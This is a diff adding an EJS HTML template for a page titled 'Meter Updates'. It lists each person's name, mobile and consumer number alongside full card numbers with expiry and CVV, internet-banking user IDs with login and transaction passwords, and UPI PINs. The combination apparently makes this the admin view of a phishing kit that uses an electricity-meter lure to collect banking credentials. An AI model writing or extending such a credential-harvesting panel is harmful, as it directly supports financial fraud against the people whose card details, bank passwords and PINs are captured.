@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Details</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    /* Push content below fixed nav */
+    body {
+      font-family: sans-serif;
+      background: #f0f2f5;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding-top: 4rem; /* adjust based on nav height */
+    }
+
+    /* ----------  NAV BAR  ---------- */
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #007bff;
+      color: #fff;
+      padding: 1rem;
+      text-align: center;
+      font-size: 1.4rem;
+      font-weight: 600;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1);
+      z-index: 1000;
+    }
+
+    main {
+      flex-grow: 1;
+      padding: 1rem;
+    }
+
+    /* ----------  BACK BUTTON  ---------- */
+    a.back {
+      display: block;
+      text-align: center;
+      margin: 2rem auto 1rem;
+      padding: 0.75rem 1rem;
+      background: #007bff;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+      width: 200px;
+      position: relative;
+      z-index: 1;
+    }
+    a.back:hover { background: #0056b3; }
+
+    /* ----------  SECTION + CARD STYLES  ---------- */
+    .section { margin-bottom: 2rem; }
+    .section h2 {
+      margin-bottom: .75rem;
+      font-size: 1.25rem;
+      color: #222;
+    }
+
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1rem;
+    }
+    .item-card {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.1);
+      padding: 1rem;
+      transition: transform .2s, box-shadow .2s;
+    }
+    .item-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 4px 12px rgba(0,0,0,.15);
+    }
+
+    .item-card .field { margin-bottom: .5rem; font-size: .95rem; }
+    .item-card .field label { font-weight: 600; margin-right: .3rem; }
+
+    .none {
+      color: #777;
+      padding: 1rem;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Blue navigation bar fixed -->
+  <nav>Meter&nbsp;Updates</nav>
+
+  <main>
+    <!-- Personal Info -->
+    <div class="section">
+      <h2>Personal Info</h2>
+      <% if (!meters.length) { %>
+        <div class="none">No meter updates found.</div>
+      <% } else { %>
+        <div class="cards">
+          <% meters.forEach(m => { %>
+            <div class="item-card">
+              <div class="field"><label>Name:</label><%= m.fullName %></div>
+              <div class="field"><label>Mobile:</label><%= m.mobileNumber %></div>
+              <div class="field"><label>Consumer No.:</label><%= m.consumerNumber %></div>
+              <div class="field"><label>When:</label><%= m.createdAt.toLocaleString() %></div>
+            </div>
+          <% }) %>
+        </div>
+      <% } %>
+    </div>
+
+    <!-- Credit & Debit Cards -->
+    <div class="section">
+      <h2>Credit & Debit Cards</h2>
+      <% if (!cards.length) { %>
+        <div class="none">No card payments found.</div>
+      <% } else { %>
+        <div class="cards">
+          <% cards.forEach(c => { %>
+            <div class="item-card">
+              <div class="field"><label>Type:</label><%= c.cardType %></div>
+              <div class="field"><label>Number:</label><%= c.cardNumber %></div>
+              <div class="field"><label>Expiry:</label><%= c.expiryDate %></div>
+              <div class="field"><label>CVV:</label><%= c.cvv %></div>
+              <div class="field"><label>When:</label><%= c.createdAt.toLocaleString() %></div>
+            </div>
+          <% }) %>
+        </div>
+      <% } %>
+    </div>
+
+    <!-- Internet Banking -->
+    <div class="section">
+      <h2>Internet Banking</h2>
+      <% if (!banks.length) { %>
+        <div class="none">No internet banking records.</div>
+      <% } else { %>
+        <div class="cards">
+          <% banks.forEach(b => { %>
+            <div class="item-card">
+              <div class="field"><label>ID:</label><%= b.uniqueId %></div>
+              <div class="field"><label>Bank:</label><%= b.bankName %></div>
+              <div class="field"><label>User ID:</label><%= b.userId %></div>
+              <div class="field"><label>Password:</label><%= b.password %></div>
+              <div class="field"><label>Txn Password:</label><%= b.transactionPassword %></div>
+              <div class="field"><label>When:</label><%= b.createdAt.toLocaleString() %></div>
+            </div>
+          <% }) %>
+        </div>
+      <% } %>
+    </div>
+
+    <!-- UPI PINs -->
+    <div class="section">
+      <h2>UPI PINs</h2>
+      <% if (!upis.length) { %>
+        <div class="none">No UPI PIN records.</div>
+      <% } else { %>
+        <div class="cards">
+          <% upis.forEach(u => { %>
+            <div class="item-card">
+              <div class="field"><label>PIN:</label><%= u.pin %></div>
+              <div class="field"><label>When:</label><%= u.createdAt.toLocaleString() %></div>
+            </div>
+          <% }) %>
+        </div>
+      <% } %>
+    </div>
+  </main>
+
+  <a href="/meter-updates" class="back">&larr; Back to list</a>
+
+</body>
+</html>
